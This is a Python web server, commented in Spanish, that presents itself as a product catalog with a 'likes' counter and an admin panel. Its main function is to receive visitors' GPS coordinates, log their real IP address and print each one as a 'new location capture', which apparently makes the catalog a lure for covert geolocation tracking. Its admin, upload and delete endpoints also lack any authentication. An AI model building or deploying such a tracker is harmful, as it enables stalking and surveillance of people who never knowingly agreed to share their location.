from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime

data_store = []

class CustomHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        global data_store
        if self.path == '/api/location':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                location = json.loads(post_data.decode('utf-8'))
                # Obtener la IP real si estamos detrás de un proxy (ej. Render)
                forwarded_for = self.headers.get('X-Forwarded-For')
                if forwarded_for:
                    location['ip'] = forwarded_for.split(',')[0].strip()
                else:
                    location['ip'] = self.client_address[0]
                # Guardar en data_store
                import uuid
                location['id'] = str(uuid.uuid4())
                location['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                data_store.append(location)
                
                # Actualizar contador de likes si hay productId
                product_id = location.get('productId')
                if product_id:
                    try:
                        import os
                        prods = []
                        if os.path.exists('products.json'):
                            with open('products.json', 'r', encoding='utf-8') as f:
                                prods = json.load(f)
                        for p in prods:
                            if str(p['id']) == str(product_id):
                                p['likes'] = p.get('likes', 0) + 1
                                break
                        with open('products.json', 'w', encoding='utf-8') as f:
                            json.dump(prods, f)
                    except Exception as ex:
                        print("Error actualizando likes:", ex)
                
                # Mostrar en la consola del servidor
                print(f"\n[+] ¡NUEVA CAPTURA DE UBICACIÓN!")
                print(f"    Hora: {location['timestamp']}")
                print(f"    IP: {location['ip']}")
                print(f"    Coordenadas: {location.get('latitude')}, {location.get('longitude')}\n")
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/locations/clear':
            data_store.clear()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            
        elif self.path == '/api/locations/delete_selected':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                ids_to_delete = payload.get('ids', [])
                data_store[:] = [loc for loc in data_store if loc.get('id') not in ids_to_delete]
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/products':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                import os
                
                products = []
                if os.path.exists('products.json'):
                    with open('products.json', 'r', encoding='utf-8') as f:
                        products = json.load(f)
                        
                # Si es para editar
                if 'id' in payload and 'name' in payload:
                    for p in products:
                        if str(p['id']) == str(payload['id']):
                            p['name'] = payload['name']
                            break
                
                with open('products.json', 'w', encoding='utf-8') as f:
                    json.dump(products, f)
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
                
        elif self.path == '/api/upload':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                payload = json.loads(post_data.decode('utf-8'))
                filename = payload.get('filename')
                filedata_b64 = payload.get('filedata')
                
                if "," in filedata_b64:
                    filedata_b64 = filedata_b64.split(",")[1]
                    
                import base64
                import os
                import time
                
                if not os.path.exists('uploads'):
                    os.makedirs('uploads')
                    
                filepath = os.path.join('uploads', os.path.basename(filename))
                with open(filepath, 'wb') as f:
                    f.write(base64.b64decode(filedata_b64))
                
                # Actualizar products.json
                try:
                    products = []
                    if os.path.exists('products.json'):
                        with open('products.json', 'r', encoding='utf-8') as f:
                            products = json.load(f)
                    
                    web_filepath = filepath.replace('\\', '/')
                    new_product = {
                        "id": str(int(time.time())),
                        "image": web_filepath,
                        "name": "Look Añadido"
                    }
                    products.append(new_product)
                    
                    with open('products.json', 'w', encoding='utf-8') as f:
                        json.dump(products, f)
                except Exception as ex:
                    print("Error actualizando products.json:", ex)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success", "file": filepath}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_DELETE(self):
        if self.path.startswith('/api/products/'):
            product_id = self.path.split('/')[-1]
            try:
                import os
                products = []
                if os.path.exists('products.json'):
                    with open('products.json', 'r', encoding='utf-8') as f:
                        products = json.load(f)
                
                new_products = [p for p in products if str(p['id']) != str(product_id)]
                
                # Opcional: borrar el archivo físico si está en uploads/
                for p in products:
                    if str(p['id']) == str(product_id) and p['image'].startswith('uploads/'):
                        try:
                            if os.path.exists(p['image']):
                                os.remove(p['image'])
                        except:
                            pass
                
                with open('products.json', 'w', encoding='utf-8') as f:
                    json.dump(new_products, f)
                    
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
        elif self.path == '/api/locations':
            global data_store
            data_store.clear()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/api/products':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            import os
            if os.path.exists('products.json'):
                with open('products.json', 'r', encoding='utf-8') as f:
                    self.wfile.write(f.read().encode('utf-8'))
            else:
                self.wfile.write(b'[]')
        elif self.path == '/api/locations':
            import uuid
            global data_store
            for loc in data_store:
                if 'id' not in loc:
                    loc['id'] = str(uuid.uuid4())
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            self.wfile.write(json.dumps(data_store).encode('utf-8'))
        else:
            super().do_GET()

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), CustomHandler)
    print(f"Servidor iniciado en http://0.0.0.0:{port}")
    print(f"Catálogo público: http://0.0.0.0:{port}")
    print(f"Panel de administración: http://0.0.0.0:{port}/admin.html")
    server.serve_forever()
